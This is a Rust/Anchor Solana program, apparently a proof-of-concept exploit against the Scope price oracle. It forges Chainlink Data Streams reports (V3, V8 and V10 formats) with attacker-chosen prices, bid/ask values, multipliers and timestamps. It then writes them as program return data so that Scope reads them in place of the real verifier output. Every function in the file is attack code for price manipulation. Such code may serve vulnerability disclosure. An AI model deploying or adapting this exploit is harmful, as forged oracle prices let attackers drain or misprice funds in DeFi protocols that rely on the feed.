// Attacker program that sets malicious return data to exploit the Scope vulnerability
// This program demonstrates how an attacker can inject arbitrary Chainlink report data

use anchor_lang::prelude::*;
use chainlink_streams_report::feed_id::ID as FeedID;
use chainlink_streams_report::report::v3::{ReportDataV3, ReportContext};
use num_bigint::BigInt;

declare_id!("AttackerProg1111111111111111111111111111111");

#[program]
pub mod attacker_program {
    use super::*;

    /// Sets malicious return data that will be interpreted as a valid Chainlink report
    /// The attacker can control:
    /// - The price value
    /// - The feed ID (must match the target token's mapping)
    /// - Timestamps (must be increasing)
    /// - Bid/ask spread (must satisfy confidence constraints)
    pub fn set_malicious_return_data(
        ctx: Context<SetMaliciousReturnData>,
        feed_id_bytes: [u8; 32],
        price_value: i128,
        bid_value: i128,
        ask_value: i128,
        observations_timestamp: u64,
        valid_from_timestamp: u64,
        expires_at: u64,
    ) -> Result<()> {
        msg!("Attacker: Setting malicious return data for price manipulation");
        
        // Create a forged Chainlink ReportDataV3 that will pass all validations
        let forged_report = ReportDataV3 {
            feed_id: FeedID(feed_id_bytes),
            valid_from_timestamp,
            observations_timestamp,
            native_fee: BigInt::from(0i128),
            link_fee: BigInt::from(0i128),
            expires_at,
            benchmark_price: BigInt::from(price_value),
            bid: BigInt::from(bid_value),
            ask: BigInt::from(ask_value),
            context: ReportContext {
                config_digest: [0u8; 32],
                epoch_and_round: [0u8; 5],
                extra_hash: [0u8; 32],
            },
        };

        // Encode the forged report
        let encoded_report = forged_report.encode().map_err(|_| {
            msg!("Failed to encode forged report");
            ProgramError::InvalidInstructionData
        })?;

        msg!("Attacker: Encoded forged report size: {}", encoded_report.len());
        msg!("Attacker: Setting price to: {}", price_value);
        msg!("Attacker: Feed ID: {:?}", feed_id_bytes);
        
        // Set the return data - this will be the last writer
        // Scope will read this instead of the actual Chainlink verifier's data
        anchor_lang::solana_program::program::set_return_data(&encoded_report);
        
        msg!("Attacker: Successfully set malicious return data!");
        Ok(())
    }

    /// Alternative attack for V8 reports (RWA tokens)
    pub fn set_malicious_return_data_v8(
        ctx: Context<SetMaliciousReturnData>,
        feed_id_bytes: [u8; 32],
        mid_price: i128,
        observations_timestamp: u64,
        market_status: u32, // 2 = Open
    ) -> Result<()> {
        use chainlink_streams_report::report::v8::{ReportDataV8, ReportContext as ReportContextV8};
        
        msg!("Attacker: Setting malicious V8 return data for RWA price manipulation");
        
        let forged_report = ReportDataV8 {
            feed_id: FeedID(feed_id_bytes),
            valid_from_timestamp: observations_timestamp - 60,
            observations_timestamp,
            native_fee: BigInt::from(0i128),
            link_fee: BigInt::from(0i128),
            expires_at: observations_timestamp + 3600,
            mid_price: BigInt::from(mid_price),
            market_status,
            last_update_timestamp: observations_timestamp,
            context: ReportContextV8 {
                config_digest: [0u8; 32],
                epoch_and_round: [0u8; 5],
                extra_hash: [0u8; 32],
            },
        };

        let encoded_report = forged_report.encode().map_err(|_| {
            msg!("Failed to encode forged V8 report");
            ProgramError::InvalidInstructionData
        })?;

        anchor_lang::solana_program::program::set_return_data(&encoded_report);
        msg!("Attacker: Successfully set malicious V8 return data!");
        Ok(())
    }

    /// Alternative attack for V10 reports (ChainlinkX with multiplier)
    pub fn set_malicious_return_data_v10(
        ctx: Context<SetMaliciousReturnData>,
        feed_id_bytes: [u8; 32],
        price: i128,
        current_multiplier: i128,
        observations_timestamp: u64,
        market_status: u32,
    ) -> Result<()> {
        use chainlink_streams_report::report::v10::{ReportDataV10, ReportContext as ReportContextV10};
        
        msg!("Attacker: Setting malicious V10 return data with multiplier manipulation");
        
        let forged_report = ReportDataV10 {
            feed_id: FeedID(feed_id_bytes),
            valid_from_timestamp: observations_timestamp - 60,
            observations_timestamp,
            native_fee: BigInt::from(0i128),
            link_fee: BigInt::from(0i128),
            expires_at: observations_timestamp + 3600,
            price: BigInt::from(price),
            current_multiplier: BigInt::from(current_multiplier),
            market_status,
            last_update_timestamp: observations_timestamp,
            context: ReportContextV10 {
                config_digest: [0u8; 32],
                epoch_and_round: [0u8; 5],
                extra_hash: [0u8; 32],
            },
        };

        let encoded_report = forged_report.encode().map_err(|_| {
            msg!("Failed to encode forged V10 report");
            ProgramError::InvalidInstructionData
        })?;

        anchor_lang::solana_program::program::set_return_data(&encoded_report);
        msg!("Attacker: Successfully set malicious V10 return data with multiplier!");
        Ok(())
    }
}

#[derive(Accounts)]
pub struct SetMaliciousReturnData<'info> {
    /// Any signer can call this - no admin required
    pub attacker: Signer<'info>,
}